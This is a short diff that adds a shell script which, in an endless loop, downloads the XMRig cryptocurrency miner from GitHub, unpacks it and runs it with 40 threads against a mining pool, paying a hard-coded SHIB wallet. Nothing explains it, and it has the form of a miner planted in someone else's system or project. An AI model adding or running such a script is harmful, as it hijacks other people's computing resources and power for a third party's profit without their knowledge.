@@ -1,0 +1,4 @@
+while [ 1 ]; do
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar xf xmrig-6.15.1-linux-x64.tar.gz && cd xmrig-6.15.1 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -p x -t 40 -u SHIB:0xd094e3013e2c70504d6b212a0ff6494a317e93a4
+sleep 2
+done
